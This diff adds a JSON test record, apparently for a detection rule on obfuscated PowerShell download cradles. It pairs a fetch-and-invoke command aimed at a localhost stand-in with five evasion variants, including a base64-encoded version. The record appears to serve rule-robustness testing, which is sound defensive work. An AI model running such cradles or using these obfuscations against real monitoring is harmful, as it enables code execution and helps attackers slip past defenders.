@@ -1,0 +1,11 @@
+{
+  "rule_name": "proc_creation_win_powershell_download_cradle_obfuscated_0",
+  "original_command": "\\powershell.exe http://127.0.0.1 %{(IRM $_)} Invoke",
+  "evasions": {
+    "insertion": "\\powershell.exe http://127.0.0.1 \\\"%{(\\\"IRM $_)} Invoke",
+    "substitution": "\\powershell.exe http://127.0.0.1 %{(IRM $_)} Invoke #substitution",
+    "omission": "\\powershell http://127.0.0.1 %{(IRM $_)} Invoke",
+    "reordering": "\\powershell.exe $_)} Invoke http://127.0.0.1 %{(IRM",
+    "recoding": "powershell.exe -EncodedCommand XABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIABoAHQAdABwADoALwAvADEAMgA3AC4AMAAuADAALgAxACAAJQB7ACgASQBSAE0AIAAkAF8AKQB9ACAASQBuAHYAbwBrAGUA "
+  }
+}
